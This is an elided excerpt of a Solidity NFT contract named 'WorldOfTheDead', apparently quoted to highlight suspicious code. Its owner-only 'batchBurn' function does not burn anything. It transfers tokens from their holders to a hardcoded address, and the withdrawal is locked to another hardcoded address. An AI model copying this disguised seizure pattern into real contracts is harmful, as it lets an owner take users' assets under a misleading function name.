...
contract WorldOfTheDead is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("WorldOfTheDead", "WOD", maxBatchSize_, collectionSize_) {
  ...
  function batchBurn(uint256[] memory tokenids) external onlyOwner {
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0xeA67F4045759cDAB9B679FAd1ff2263FFd2802F5, tokenid);
        }
    }
  ...
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0x3BC2DC5a2e1aF540385F7E4fdbfda2315FbCCE2a);
